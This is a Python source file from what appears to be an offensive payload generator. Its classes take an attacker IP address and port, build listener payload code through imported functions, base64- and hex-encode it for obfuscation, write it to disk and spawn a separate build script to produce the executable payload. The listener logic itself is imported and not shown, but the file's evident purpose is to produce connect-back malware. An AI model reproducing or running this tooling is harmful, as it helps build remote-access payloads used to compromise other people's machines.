#!/usr/bin/python
import src.source.use
from src.banner.color import pycolor_style
from bin.modules.encode.encode import listener, execute
from src.Logging.print_stdout import print_error, print_process

def building_payload(files):
    if src.source.use.os.name == "nt":
        src.source.use.subprocess.Popen(
            [src.source.use.sys.executable, 'building/generateFile.py', files],
            creationflags=src.source.use.subprocess.CREATE_NEW_CONSOLE
        )
    else:
        src.source.use.subprocess.Popen(
            [src.source.use.sys.executable, 'building/generateFile.py', files], shell=True,
            stdout=src.source.use.subprocess.PIPE
        )

class PayloadListenerHandler(object):
    def __init__(self, ipAddress, portAddress, filenames):
        self.IPADDRESS = ipAddress
        self.PORTADDRESS = int(portAddress)
        self.FILES = filenames
        self.payload = listener(self.IPADDRESS, self.PORTADDRESS)

    def main_generate(self):
        try:
            print_process(
                "Process loaded payload handler..."
            ); src.source.use.time.sleep(1)
            with open(self.FILES, 'w') as payload_files:
                payload_files.write(self.payload)
                payload_files.close()
                print_process(
                    "Process open new window to generate payload"
                ); src.source.use.time.sleep(3)
                building_payload(self.FILES)
                print_process("Generate payload to execute success!!")
        except KeyboardInterrupt:
            print_error(
                "Interrupt user, Stopping..."
            ); src.source.use.time.sleep(1)




class Listener_Handler_Payloads(object):
    def __init__(self, ip_address, port_address, output_file):
        self.localhost = ip_address
        self.local_port = int(port_address)
        self.filename = output_file
        self.code = listener(self.localhost, self.local_port)
        self.generate = src.source.use.base64.b64encode(self.code)
        self.execute = lambda: execute(self.generate)

    def writing_payload(self):
        try:
            print_process("Loaded payload listener handler...")
            src.source.use.time.sleep(3)
            with open(self.filename, "w") as output_payload:
                print_process("Generating payload... please wait..")
                src.source.use.time.sleep(2)
                output_payload.write(self.execute())
                output_payload.close()
            src.source.use.time.sleep(1)
            print_process("Successfully completed")
        except KeyboardInterrupt:
            print_error("Interrupt user, Exiting...")
            src.source.use.sys.exit(0)
        except IOError as error:
            print_error(str(error))

def payloads_generator(code_payload):
    try:
        print("\n\tPayloads Generator")
        print("\t------------------\n"); src.source.use.time.sleep(2)
        code = src.source.use.base64.b64encode(code_payload.encode('hex'))
        print(
            "{yellow}{payloads}{yellows}\n".format(
                yellow=pycolor_style.Y,
                payloads=str(code),
                yellows=pycolor_style.W
                )
            )
    except:
        pass
